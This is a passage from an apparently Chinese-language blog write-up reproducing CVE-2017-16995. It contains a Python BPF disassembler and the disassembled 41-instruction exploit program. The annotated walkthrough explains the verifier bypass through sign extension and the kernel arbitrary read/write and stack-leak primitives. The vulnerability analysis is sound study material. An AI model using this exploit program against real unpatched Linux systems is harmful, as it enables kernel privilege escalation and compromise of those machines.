#<span class="comment">/* SGE is signed '&gt;=', GE in x86 */</span></span><br><span class="line">BPF_CALL = <span class="number">0x80</span>	#<span class="comment">/* function call */</span></span><br><span class="line">BPF_EXIT = <span class="number">0x90</span>	#<span class="comment">/* function return */</span></span><br><span class="line"></span><br><span class="line">BPF_PSEUDO_MAP_FD = <span class="number">1</span></span><br><span class="line"></span><br><span class="line">opcode = []</span><br><span class="line"><span class="keyword">for</span> i in range(<span class="number">256</span>):</span><br><span class="line">	opcode.append(<span class="string">""</span>)</span><br><span class="line"></span><br><span class="line">opcode[BPF_ALU | BPF_ADD | BPF_X] = <span class="string">"ALU_ADD_X"</span></span><br><span class="line">opcode[BPF_ALU | BPF_ADD | BPF_K] = <span class="string">"ALU_ADD_K"</span></span><br><span class="line">opcode[BPF_ALU | BPF_SUB | BPF_X] = <span class="string">"ALU_SUB_X"</span></span><br><span class="line">opcode[BPF_ALU | BPF_SUB | BPF_K] = <span class="string">"ALU_SUB_K"</span></span><br><span class="line">opcode[BPF_ALU | BPF_AND | BPF_X] = <span class="string">"ALU_AND_X"</span></span><br><span class="line">opcode[BPF_ALU | BPF_AND | BPF_K] = <span class="string">"ALU_AND_K"</span></span><br><span class="line">opcode[BPF_ALU | BPF_OR | BPF_X]  = <span class="string">"ALU_OR_X"</span></span><br><span class="line">opcode[BPF_ALU | BPF_OR | BPF_K]  = <span class="string">"ALU_OR_K"</span></span><br><span class="line">opcode[BPF_ALU | BPF_LSH | BPF_X] = <span class="string">"ALU_LSH_X"</span></span><br><span class="line">opcode[BPF_ALU | BPF_LSH | BPF_K] = <span class="string">"ALU_LSH_K"</span></span><br><span class="line">opcode[BPF_ALU | BPF_RSH | BPF_X] = <span class="string">"ALU_RSH_X"</span></span><br><span class="line">opcode[BPF_ALU | BPF_RSH | BPF_K] = <span class="string">"ALU_RSH_K"</span></span><br><span class="line">opcode[BPF_ALU | BPF_XOR | BPF_X] = <span class="string">"ALU_XOR_X"</span></span><br><span class="line">opcode[BPF_ALU | BPF_XOR | BPF_K] = <span class="string">"ALU_XOR_K"</span></span><br><span class="line">opcode[BPF_ALU | BPF_MUL | BPF_X] = <span class="string">"ALU_MUL_X"</span></span><br><span class="line">opcode[BPF_ALU | BPF_MUL | BPF_K] = <span class="string">"ALU_MUL_K"</span></span><br><span class="line">opcode[BPF_ALU | BPF_MOV | BPF_X] = <span class="string">"ALU_MOV_X"</span></span><br><span class="line">opcode[BPF_ALU | BPF_MOV | BPF_K] = <span class="string">"ALU_MOV_K"</span></span><br><span class="line">opcode[BPF_ALU | BPF_DIV | BPF_X] = <span class="string">"ALU_DIV_X"</span></span><br><span class="line">opcode[BPF_ALU | BPF_DIV | BPF_K] = <span class="string">"ALU_DIV_K"</span></span><br><span class="line">opcode[BPF_ALU | BPF_MOD | BPF_X] = <span class="string">"ALU_MOD_X"</span></span><br><span class="line">opcode[BPF_ALU | BPF_MOD | BPF_K] = <span class="string">"ALU_MOD_K"</span></span><br><span class="line">opcode[BPF_ALU | BPF_NEG] = <span class="string">"ALU_NEG"</span></span><br><span class="line">opcode[BPF_ALU | BPF_END | BPF_TO_BE] = <span class="string">"ALU_END_TO_BE"</span></span><br><span class="line">opcode[BPF_ALU | BPF_END | BPF_TO_LE] = <span class="string">"ALU_END_TO_LE"</span></span><br><span class="line">#<span class="comment">/* 64 bit ALU operations */</span></span><br><span class="line">opcode[BPF_ALU64 | BPF_ADD | BPF_X] = <span class="string">"ALU64_ADD_X"</span></span><br><span class="line">opcode[BPF_ALU64 | BPF_ADD | BPF_K] = <span class="string">"ALU64_ADD_K"</span></span><br><span class="line">opcode[BPF_ALU64 | BPF_SUB | BPF_X] = <span class="string">"ALU64_SUB_X"</span></span><br><span class="line">opcode[BPF_ALU64 | BPF_SUB | BPF_K] = <span class="string">"ALU64_SUB_K"</span></span><br><span class="line">opcode[BPF_ALU64 | BPF_AND | BPF_X] = <span class="string">"ALU64_AND_X"</span></span><br><span class="line">opcode[BPF_ALU64 | BPF_AND | BPF_K] = <span class="string">"ALU64_AND_K"</span></span><br><span class="line">opcode[BPF_ALU64 | BPF_OR | BPF_X] = <span class="string">"ALU64_OR_X"</span></span><br><span class="line">opcode[BPF_ALU64 | BPF_OR | BPF_K] = <span class="string">"ALU64_OR_K"</span></span><br><span class="line">opcode[BPF_ALU64 | BPF_LSH | BPF_X] = <span class="string">"ALU64_LSH_X"</span></span><br><span class="line">opcode[BPF_ALU64 | BPF_LSH | BPF_K] = <span class="string">"ALU64_LSH_K"</span></span><br><span class="line">opcode[BPF_ALU64 | BPF_RSH | BPF_X] = <span class="string">"ALU64_RSH_X"</span></span><br><span class="line">opcode[BPF_ALU64 | BPF_RSH | BPF_K] = <span class="string">"ALU64_RSH_K"</span></span><br><span class="line">opcode[BPF_ALU64 | BPF_XOR | BPF_X] = <span class="string">"ALU64_XOR_X"</span></span><br><span class="line">opcode[BPF_ALU64 | BPF_XOR | BPF_K] = <span class="string">"ALU64_XOR_K"</span></span><br><span class="line">opcode[BPF_ALU64 | BPF_MUL | BPF_X] = <span class="string">"ALU64_MUL_X"</span></span><br><span class="line">opcode[BPF_ALU64 | BPF_MUL | BPF_K] = <span class="string">"ALU64_MUL_K"</span></span><br><span class="line">opcode[BPF_ALU64 | BPF_MOV | BPF_X] = <span class="string">"ALU64_MOV_X"</span></span><br><span class="line">opcode[BPF_ALU64 | BPF_MOV | BPF_K] = <span class="string">"ALU64_MOV_K"</span></span><br><span class="line">opcode[BPF_ALU64 | BPF_ARSH | BPF_X] = <span class="string">"ALU64_ARSH_X"</span></span><br><span class="line">opcode[BPF_ALU64 | BPF_ARSH | BPF_K] = <span class="string">"ALU64_ARSH_K"</span></span><br><span class="line">opcode[BPF_ALU64 | BPF_DIV | BPF_X] = <span class="string">"ALU64_DIV_X"</span></span><br><span class="line">opcode[BPF_ALU64 | BPF_DIV | BPF_K] = <span class="string">"ALU64_DIV_K"</span></span><br><span class="line">opcode[BPF_ALU64 | BPF_MOD | BPF_X] = <span class="string">"ALU64_MOD_X"</span></span><br><span class="line">opcode[BPF_ALU64 | BPF_MOD | BPF_K] = <span class="string">"ALU64_MOD_K"</span></span><br><span class="line">opcode[BPF_ALU64 | BPF_NEG] = <span class="string">"ALU64_NEG"</span></span><br><span class="line">#<span class="comment">/* Call instruction */</span></span><br><span class="line">opcode[BPF_JMP | BPF_CALL] = <span class="string">"JMP_CALL"</span></span><br><span class="line">opcode[BPF_JMP | BPF_CALL | BPF_X] = <span class="string">"JMP_TAIL_CALL"</span></span><br><span class="line">#<span class="comment">/* Jumps */</span></span><br><span class="line">opcode[BPF_JMP | BPF_JA] = <span class="string">"JMP_JA"</span></span><br><span class="line">opcode[BPF_JMP | BPF_JEQ | BPF_X] = <span class="string">"JMP_JEQ_X"</span></span><br><span class="line">opcode[BPF_JMP | BPF_JEQ | BPF_K] = <span class="string">"JMP_JEQ_K"</span></span><br><span class="line">opcode[BPF_JMP | BPF_JNE | BPF_X] = <span class="string">"JMP_JNE_X"</span></span><br><span class="line">opcode[BPF_JMP | BPF_JNE | BPF_K] = <span class="string">"JMP_JNE_K"</span></span><br><span class="line">opcode[BPF_JMP | BPF_JGT | BPF_X] = <span class="string">"JMP_JGT_X"</span></span><br><span class="line">opcode[BPF_JMP | BPF_JGT | BPF_K] = <span class="string">"JMP_JGT_K"</span></span><br><span class="line">opcode[BPF_JMP | BPF_JGE | BPF_X] = <span class="string">"JMP_JGE_X"</span></span><br><span class="line">opcode[BPF_JMP | BPF_JGE | BPF_K] = <span class="string">"JMP_JGE_K"</span></span><br><span class="line">opcode[BPF_JMP | BPF_JSGT | BPF_X] = <span class="string">"JMP_JSGT_X"</span></span><br><span class="line">opcode[BPF_JMP | BPF_JSGT | BPF_K] = <span class="string">"JMP_JSGT_K"</span></span><br><span class="line">opcode[BPF_JMP | BPF_JSGE | BPF_X] = <span class="string">"JMP_JSGE_X"</span></span><br><span class="line">opcode[BPF_JMP | BPF_JSGE | BPF_K] = <span class="string">"JMP_JSGE_K"</span></span><br><span class="line">opcode[BPF_JMP | BPF_JSET | BPF_X] = <span class="string">"JMP_JSET_X"</span></span><br><span class="line">opcode[BPF_JMP | BPF_JSET | BPF_K] = <span class="string">"JMP_JSET_K"</span></span><br><span class="line">#<span class="comment">/* Program return */</span></span><br><span class="line">opcode[BPF_JMP | BPF_EXIT] = <span class="string">"JMP_EXIT"</span></span><br><span class="line">#<span class="comment">/* Store instructions */</span></span><br><span class="line">opcode[BPF_STX | BPF_MEM | BPF_B] = <span class="string">"STX_MEM_B"</span></span><br><span class="line">opcode[BPF_STX | BPF_MEM | BPF_H] = <span class="string">"STX_MEM_H"</span></span><br><span class="line">opcode[BPF_STX | BPF_MEM | BPF_W] = <span class="string">"STX_MEM_W"</span></span><br><span class="line">opcode[BPF_STX | BPF_MEM | BPF_DW] = <span class="string">"STX_MEM_DW"</span></span><br><span class="line">opcode[BPF_STX | BPF_XADD | BPF_W] = <span class="string">"STX_XADD_W"</span></span><br><span class="line">opcode[BPF_STX | BPF_XADD | BPF_DW] = <span class="string">"STX_XADD_DW"</span></span><br><span class="line">opcode[BPF_ST | BPF_MEM | BPF_B] = <span class="string">"ST_MEM_B"</span></span><br><span class="line">opcode[BPF_ST | BPF_MEM | BPF_H] = <span class="string">"ST_MEM_H"</span></span><br><span class="line">opcode[BPF_ST | BPF_MEM | BPF_W] = <span class="string">"ST_MEM_W"</span></span><br><span class="line">opcode[BPF_ST | BPF_MEM | BPF_DW] = <span class="string">"ST_MEM_DW"</span></span><br><span class="line">#<span class="comment">/* Load instructions */</span></span><br><span class="line">opcode[BPF_LDX | BPF_MEM | BPF_B] = <span class="string">"LDX_MEM_B"</span></span><br><span class="line">opcode[BPF_LDX | BPF_MEM | BPF_H] = <span class="string">"LDX_MEM_H"</span></span><br><span class="line">opcode[BPF_LDX | BPF_MEM | BPF_W] = <span class="string">"LDX_MEM_W"</span></span><br><span class="line">opcode[BPF_LDX | BPF_MEM | BPF_DW] = <span class="string">"LDX_MEM_DW"</span></span><br><span class="line">opcode[BPF_LD | BPF_ABS | BPF_W] = <span class="string">"LD_ABS_W"</span></span><br><span class="line">opcode[BPF_LD | BPF_ABS | BPF_H] = <span class="string">"LD_ABS_H"</span></span><br><span class="line">opcode[BPF_LD | BPF_ABS | BPF_B] = <span class="string">"LD_ABS_B"</span></span><br><span class="line">opcode[BPF_LD | BPF_IND | BPF_W] = <span class="string">"LD_IND_W"</span></span><br><span class="line">opcode[BPF_LD | BPF_IND | BPF_H] = <span class="string">"LD_IND_H"</span></span><br><span class="line">opcode[BPF_LD | BPF_IND | BPF_B] = <span class="string">"LD_IND_B"</span></span><br><span class="line">opcode[BPF_LD | BPF_IMM | BPF_DW] = <span class="string">"LD_IMM_DW"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">struct bpf_insn &#123;</span><br><span class="line">	__u8	code;		<span class="comment">/* opcode */</span>  </span><br><span class="line">	__u8	dst_reg:<span class="number">4</span>;	<span class="comment">/* dest register */</span>    </span><br><span class="line">	__u8	src_reg:<span class="number">4</span>;	<span class="comment">/* source register */</span>  </span><br><span class="line">	__s16	off;		<span class="comment">/* signed offset */</span>    </span><br><span class="line">	__s32	imm;		<span class="comment">/* signed immediate constant */</span> </span><br><span class="line">&#125;;</span><br><span class="line"><span class="string">'''</span></span><br><span class="line">regs = [<span class="string">"BPF_REG_0"</span>,<span class="string">"BPF_REG_1"</span>,<span class="string">"BPF_REG_2"</span>,<span class="string">"BPF_REG_3"</span>,<span class="string">"BPF_REG_4"</span>,</span><br><span class="line">        <span class="string">"BPF_REG_5"</span>,<span class="string">"BPF_REG_6"</span>,<span class="string">"BPF_REG_7"</span>,<span class="string">"BPF_REG_8"</span>,<span class="string">"BPF_REG_9"</span>,<span class="string">"BPF_REG_10"</span>]</span><br><span class="line"></span><br><span class="line">def u32(imm):</span><br><span class="line">	<span class="keyword">if</span>(len(imm) != <span class="number">4</span>):</span><br><span class="line">		imm = imm + '\x00'*(4-len(imm))</span><br><span class="line">	imm_num = ord(imm[<span class="number">0</span>]) + (ord(imm[<span class="number">1</span>]) &lt;&lt; <span class="number">8</span>) + (ord(imm[<span class="number">2</span>]) &lt;&lt; <span class="number">16</span>) + (ord(imm[<span class="number">3</span>]) &lt;&lt; <span class="number">24</span>)</span><br><span class="line">	<span class="keyword">return</span> imm_num</span><br><span class="line"></span><br><span class="line">def u16(imm):</span><br><span class="line">	<span class="keyword">if</span>(len(imm) != <span class="number">2</span>):</span><br><span class="line">		imm = imm + '\x00'*(2-len(imm))</span><br><span class="line">	imm_num = ord(imm[<span class="number">0</span>]) + (ord(imm[<span class="number">1</span>]) &lt;&lt; <span class="number">8</span>)</span><br><span class="line">	<span class="keyword">return</span> imm_num</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i in range(len(prog)):</span><br><span class="line">	ins = prog[i].strip()</span><br><span class="line">	code = opcode[ord(ins[<span class="number">0</span>])]</span><br><span class="line">	src_reg = regs[(ord(ins[<span class="number">1</span>]) &gt;&gt; <span class="number">4</span>) &amp; <span class="number">0xf</span>]</span><br><span class="line">	dst_reg = regs[ord(ins[<span class="number">1</span>]) &amp; <span class="number">0x0f</span>]</span><br><span class="line">	off = u16(ins[<span class="number">2</span>:<span class="number">4</span>])</span><br><span class="line">	imm = ins[<span class="number">4</span>:]</span><br><span class="line">	imm = u32(imm)</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> code == <span class="string">"LD_IMM_DW"</span> <span class="keyword">and</span> ((ord(ins[<span class="number">1</span>]) &gt;&gt; <span class="number">4</span>) &amp; <span class="number">0xf</span>) == BPF_PSEUDO_MAP_FD:</span><br><span class="line">		<span class="keyword">if</span> i != len(prog) - <span class="number">1</span> <span class="keyword">and</span> prog[i+<span class="number">1</span>] == <span class="string">"\x00\x00\x00\x00\x00\x00\x00\x00"</span>:</span><br><span class="line">			code = <span class="string">"LD_MAP_FD"</span></span><br><span class="line">			insn = code + '(' + dst_reg + ', ' + 'map_addr' + ')'</span><br><span class="line">	elif ins == <span class="string">"\x00\x00\x00\x00\x00\x00\x00\x00"</span>:</span><br><span class="line">		insn = <span class="string">"bpf_map_padding"</span></span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		insn = code + '('+ dst_reg + ', ' + src_reg + ', ' + str(hex(off)) + ', ' + str(hex(imm)) + ')' </span><br><span class="line">	print(<span class="string">"[%d]: %s"</span> %(i,insn))</span><br></pre></td></tr></table></figure></p>
<p>prog一共有41条指令，脚本对指令[10],[18],[26]的指令类型无法识别，结合exp及<a href="https://xz.aliyun.com/t/2212" target="_blank" rel="noopener">其他博客</a>对少数指令进行了修正：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">[0]: ALU_MOV_K(BPF_REG_9, BPF_REG_0, 0x0, 0xffffffff)</span><br><span class="line">[1]: JMP_JNE_K(BPF_REG_9, BPF_REG_0, 0x2, 0xffffffff)</span><br><span class="line">[2]: ALU64_MOV_K(BPF_REG_0, BPF_REG_0, 0x0, 0x0)</span><br><span class="line">[3]: JMP_EXIT(BPF_REG_0, BPF_REG_0, 0x0, 0x0)</span><br><span class="line">[4]: LD_MAP_FD(BPF_REG_9, map_addr)</span><br><span class="line">[5]: bpf_map_padding</span><br><span class="line">[6]: ALU64_MOV_X(BPF_REG_1, BPF_REG_9, 0x0, 0x0)</span><br><span class="line">[7]: ALU64_MOV_X(BPF_REG_2, BPF_REG_10, 0x0, 0x0)</span><br><span class="line">[8]: ALU64_ADD_K(BPF_REG_2, BPF_REG_0, 0x0, 0xfffffffc)</span><br><span class="line">[9]: ST_MEM_W(BPF_REG_10, BPF_REG_0, 0xfffc, 0x0)</span><br><span class="line">[10]: BPF_RAW_INSN(BPF_JMP | BPF_CALL, BPF_REG_0, BPF_REG_0, 0, BPF_FUNC_map_lookup_elem)</span><br><span class="line">[11]: JMP_JNE_K(BPF_REG_0, BPF_REG_0, 0x1, 0x0)</span><br><span class="line">[12]: JMP_EXIT(BPF_REG_0, BPF_REG_0, 0x0, 0x0)</span><br><span class="line">[13]: LDX_MEM_DW(BPF_REG_6, BPF_REG_0, 0x0, 0x0)</span><br><span class="line">[14]: ALU64_MOV_X(BPF_REG_1, BPF_REG_9, 0x0, 0x0)</span><br><span class="line">[15]: ALU64_MOV_X(BPF_REG_2, BPF_REG_10, 0x0, 0x0)</span><br><span class="line">[16]: ALU64_ADD_K(BPF_REG_2, BPF_REG_0, 0x0, 0xfffffffc)</span><br><span class="line">[17]: ST_MEM_W(BPF_REG_10, BPF_REG_0, 0xfffc, 0x1)</span><br><span class="line">[18]: BPF_RAW_INSN(BPF_JMP | BPF_CALL, BPF_REG_0, BPF_REG_0, 0, BPF_FUNC_map_lookup_elem)</span><br><span class="line">[19]: JMP_JNE_K(BPF_REG_0, BPF_REG_0, 0x1, 0x0)</span><br><span class="line">[20]: JMP_EXIT(BPF_REG_0, BPF_REG_0, 0x0, 0x0)</span><br><span class="line">[21]: LDX_MEM_DW(BPF_REG_7, BPF_REG_0, 0x0, 0x0)</span><br><span class="line">[22]: ALU64_MOV_X(BPF_REG_1, BPF_REG_9, 0x0, 0x0)</span><br><span class="line">[23]: ALU64_MOV_X(BPF_REG_2, BPF_REG_10, 0x0, 0x0)</span><br><span class="line">[24]: ALU64_ADD_K(BPF_REG_2, BPF_REG_0, 0x0, 0xfffffffc)</span><br><span class="line">[25]: ST_MEM_W(BPF_REG_10, BPF_REG_0, 0xfffc, 0x2)</span><br><span class="line">[26]: BPF_RAW_INSN(BPF_JMP | BPF_CALL, BPF_REG_0, BPF_REG_0, 0, BPF_FUNC_map_lookup_elem)</span><br><span class="line">[27]: JMP_JNE_K(BPF_REG_0, BPF_REG_0, 0x1, 0x0)</span><br><span class="line">[28]: JMP_EXIT(BPF_REG_0, BPF_REG_0, 0x0, 0x0)</span><br><span class="line">[29]: LDX_MEM_DW(BPF_REG_8, BPF_REG_0, 0x0, 0x0)</span><br><span class="line">[30]: ALU64_MOV_X(BPF_REG_2, BPF_REG_0, 0x0, 0x0)</span><br><span class="line">[31]: ALU64_MOV_K(BPF_REG_0, BPF_REG_0, 0x0, 0x0)</span><br><span class="line">[32]: JMP_JNE_K(BPF_REG_6, BPF_REG_0, 0x3, 0x0)</span><br><span class="line">[33]: LDX_MEM_DW(BPF_REG_3, BPF_REG_7, 0x0, 0x0)</span><br><span class="line">[34]: STX_MEM_DW(BPF_REG_2, BPF_REG_3, 0x0, 0x0)</span><br><span class="line">[35]: JMP_EXIT(BPF_REG_0, BPF_REG_0, 0x0, 0x0)</span><br><span class="line">[36]: JMP_JNE_K(BPF_REG_6, BPF_REG_0, 0x2, 0x1)</span><br><span class="line">[37]: STX_MEM_DW(BPF_REG_2, BPF_REG_10, 0x0, 0x0)</span><br><span class="line">[38]: JMP_EXIT(BPF_REG_0, BPF_REG_0, 0x0, 0x0)</span><br><span class="line">[39]: STX_MEM_DW(BPF_REG_7, BPF_REG_8, 0x0, 0x0)</span><br><span class="line">[40]: JMP_EXIT(BPF_REG_0, BPF_REG_0, 0x0, 0x0)</span><br></pre></td></tr></table></figure></p>
<h2 id="指令执行过程"><a href="#指令执行过程" class="headerlink" title="指令执行过程"></a>指令执行过程</h2><h3 id="绕过check"><a href="#绕过check" class="headerlink" title="绕过check"></a>绕过check</h3><p>分析指令[0]~[3]，指令[0]将r9赋值为0xffffffff，指令[1]为条件跳转指令，当r9 == 0xffffffff时，继续执行下一条指令，当r9 != 0xffffffff跳转到指令[4]去执行，由于在模拟执行时，r9寄存器在指令[0]时被赋值为0xffffffff，do_check认为r9恒等于0xffffffff，就不会去检查指令[4]以及后面的指令，继续模拟执行指令[2]，指令[2]将r0赋值为0，继续模拟执行，指令[3]是BPF_EXIT指令，临时栈中也没有其他分支，do_check检查结束，但其实do_check只检查了4条指令。但是在真正执行时，目的寄存器DST的类型为u64，大小是0x00000000ffffffff,IMM为类型为s32，值为0xffffffff，与DST比较时先进行符号扩展为0xffffffffffffffff，然后被认为是64位的无符号整数0xffffffffffffffff，从而导致DST != IMM，跳转条件成立，跳转到指令[4]去执行。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[0]: ALU_MOV_K(BPF_REG_9, BPF_REG_0, 0x0, 0xffffffff)</span><br><span class="line">[1]: JMP_JNE_K(BPF_REG_9, BPF_REG_0, 0x2, 0xffffffff)</span><br><span class="line">[2]: ALU64_MOV_K(BPF_REG_0, BPF_REG_0, 0x0, 0x0)</span><br><span class="line">[3]: JMP_EXIT(BPF_REG_0, BPF_REG_0, 0x0, 0x0)</span><br></pre></td></tr></table></figure></p>
<p>我们可以看到真正执行时DST和IMM的值，在函数__bpf_prog_run中下断点，程序执行至DST与IMM的比较，rbx指向的就是我们的指令<a href="&quot;\x55\x09\x02\x00\xff\xff\xff\xff&quot;">1</a>，那我们就可以判断rdx由指令movsxd rdx, dword ptr [rbx + 4]得到，movsxd为符号扩展传送指令，将IMM由s32扩展为u64，IMM也就是rdx的值变为0xffffffffffffffff:<br><img src="/2020/03/07/CVE-2017-16995复现/1.png" alt="1"><br>那另外一个就是DST的值，DST的值是0x00000000ffffffff，DST不等于IMM，然后程序从本条指令中获取到off，跳转至指令[4]去执行。<br><img src="/2020/03/07/CVE-2017-16995复现/2.png" alt="2"></p>
<h3 id="获取map地址"><a href="#获取map地址" class="headerlink" title="获取map地址"></a>获取map地址</h3><p>根据前面对replace_map_fd_with_map_ptr函数的分析，可以知道这里将bpf_map的地址赋值给r9，第五条指令是为了符合LD_MAP_FD的下一条指令的要求。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[4]: LD_MAP_FD(BPF_REG_9, map_addr) //r9 = map_addr</span><br><span class="line">[5]: bpf_map_padding</span><br></pre></td></tr></table></figure></p>
<h3 id="获取map-0-map-2"><a href="#获取map-0-map-2" class="headerlink" title="获取map[0] ~ map[2]"></a>获取map[0] ~ map[2]</h3><p>获取map[0]，存储在r6中：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[6]: ALU64_MOV_X(BPF_REG_1, BPF_REG_9, 0x0, 0x0)   //r1 = r9，即r1 = map_addr</span><br><span class="line">[7]: ALU64_MOV_X(BPF_REG_2, BPF_REG_10, 0x0, 0x0)  //r2 = r10 = rbp</span><br><span class="line">[8]: ALU64_ADD_K(BPF_REG_2, BPF_REG_0, 0x0, 0xfffffffc) //r2 = r2 + 0xfffffffc，即r2 = r2 - 4 = rbp - 4</span><br><span class="line">[9]: ST_MEM_W(BPF_REG_10, BPF_REG_0, 0xfffc, 0x0)  //[rbp - 4] = r0</span><br><span class="line">[10]: BPF_RAW_INSN(BPF_JMP | BPF_CALL, BPF_REG_0, BPF_REG_0, 0, BPF_FUNC_map_lookup_elem) //call </span><br><span class="line">[11]: JMP_JNE_K(BPF_REG_0, BPF_REG_0, 0x1, 0x0)  //if(r0 != 0): 函数bpf_lookup_elem成功执行，跳转到指令[13]处执行，否则exit(0)</span><br><span class="line">[12]: JMP_EXIT(BPF_REG_0, BPF_REG_0, 0x0, 0x0)   //exit(0)</span><br><span class="line">[13]: LDX_MEM_DW(BPF_REG_6, BPF_REG_0, 0x0, 0x0) //r6 = [r0] = map[0]</span><br></pre></td></tr></table></figure></p>
<p>获取map[1]，存储在r7中：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[14]: ALU64_MOV_X(BPF_REG_1, BPF_REG_9, 0x0, 0x0)            //r1 = r9</span><br><span class="line">[15]: ALU64_MOV_X(BPF_REG_2, BPF_REG_10, 0x0, 0x0)           //r2 = r10 = rbp</span><br><span class="line">[16]: ALU64_ADD_K(BPF_REG_2, BPF_REG_0, 0x0, 0xfffffffc)     //r2 = rbp - 4</span><br><span class="line">[17]: ST_MEM_W(BPF_REG_10, BPF_REG_0, 0xfffc, 0x1)           //[rbp - 4] = r0</span><br><span class="line">[18]: BPF_RAW_INSN(BPF_JMP | BPF_CALL, BPF_REG_0, BPF_REG_0, 0, BPF_FUNC_map_lookup_elem)</span><br><span class="line">[19]: JMP_JNE_K(BPF_REG_0, BPF_REG_0, 0x1, 0x0)              //if(r0 != 0): 函数bpf_lookup_elem成功执行，跳转到指令[13]处执行，否则exit(0)</span><br><span class="line">[20]: JMP_EXIT(BPF_REG_0, BPF_REG_0, 0x0, 0x0)               //exit(0)</span><br><span class="line">[21]: LDX_MEM_DW(BPF_REG_7, BPF_REG_0, 0x0, 0x0)             //r7 = [r0] = map[1]</span><br></pre></td></tr></table></figure></p>
<p>获取map[2]，存储在r8中：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[22]: ALU64_MOV_X(BPF_REG_1, BPF_REG_9, 0x0, 0x0)           //r1 = r9</span><br><span class="line">[23]: ALU64_MOV_X(BPF_REG_2, BPF_REG_10, 0x0, 0x0)          //r2 = r10 = rbp</span><br><span class="line">[24]: ALU64_ADD_K(BPF_REG_2, BPF_REG_0, 0x0, 0xfffffffc)    //r2 = rbp - 4</span><br><span class="line">[25]: ST_MEM_W(BPF_REG_10, BPF_REG_0, 0xfffc, 0x2)          //[rbp - 4] = r0</span><br><span class="line">[26]: BPF_RAW_INSN(BPF_JMP | BPF_CALL, BPF_REG_0, BPF_REG_0, 0, BPF_FUNC_map_lookup_elem)</span><br><span class="line">[27]: JMP_JNE_K(BPF_REG_0, BPF_REG_0, 0x1, 0x0)             //if(r0 != 0): 函数bpf_lookup_elem成功执行，跳转到指令[29]处执行，否则exit(0)</span><br><span class="line">[28]: JMP_EXIT(BPF_REG_0, BPF_REG_0, 0x0, 0x0)              //exit(0)</span><br><span class="line">[29]: LDX_MEM_DW(BPF_REG_8, BPF_REG_0, 0x0, 0x0)            //r8 = [r0] = map[2]</span><br></pre></td></tr></table></figure></p>
<h3 id="任意地址读写"><a href="#任意地址读写" class="headerlink" title="任意地址读写"></a>任意地址读写</h3><p>指令[30]~指令[40]由map[0]的值的不同导致以下情况：</p>
<ol>
<li>如果r6等于0即map[0] == 0，r3 = map[1];map[2] = r3;由于map[1]可控，因此可以进行任意地址读，将想要泄露的地址写入map[1]中，再读取map[2]的值进行泄露。</li>
<li>如果r6等于0即map[0] == 1，map[2] = rbp;将rbp写入map[2]中，可以利用map[2]来泄露栈地址。</li>
<li>如果r6不等于1即map[0] != 1，将map[2]的值写入map[1]指向的地址中，由于map[2]和map[1]我们都可控，可以利用这一分支进行任意地址写。<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[30]: ALU64_MOV_X(BPF_REG_2, BPF_REG_0, 0x0, 0x0)           //r2 = r0 = idx3</span><br><span class="line">[31]: ALU64_MOV_K(BPF_REG_0, BPF_REG_0, 0x0, 0x0)           //r0 = 0</span><br><span class="line">[32]: JMP_JNE_K(BPF_REG_6, BPF_REG_0, 0x3, 0x0)             //if(r6 != 0): 跳转到指令[36]处执行，否则继续执行下一条指令</span><br><span class="line">[33]: LDX_MEM_DW(BPF_REG_3, BPF_REG_7, 0x0, 0x0)            //r3 = [r7]</span><br><span class="line">[34]: STX_MEM_DW(BPF_REG_2, BPF_REG_3, 0x0, 0x0)            //[r2] = r3</span><br><span class="line">[35]: JMP_EXIT(BPF_REG_0, BPF_REG_0, 0x0, 0x0)              //exit(0)</span><br><span class="line">[36]: JMP_JNE_K(BPF_REG_6, BPF_REG_0, 0x2, 0x1)             //if(r6 != 1)：跳转到指令[39]处执行，否则继续执行下一条指令</span><br><span class="line">[37]: STX_MEM_DW(BPF_REG_2, BPF_REG_10, 0x0, 0x0)           //[r2] = r10 = rbp</span><br><span class="line">[38]: JMP_EXIT(BPF_REG_0, BPF_REG_0, 